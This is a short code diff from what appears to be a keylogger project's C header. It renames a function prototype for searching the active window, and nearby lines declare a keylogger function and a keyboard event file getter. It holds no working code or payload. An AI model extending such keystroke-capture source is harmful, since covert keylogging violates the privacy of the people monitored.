@@ -85,6 +85,6 @@ char *get_keyboard_event_file(void);
  */
 void keylogger(int keyboard, int writeout);
 
-void SearchActiveWindow(void);
+void searchActiveWindow(void);
 
 #endif //UNIVERSALKEYLOGGER_KEYLOGGER_H
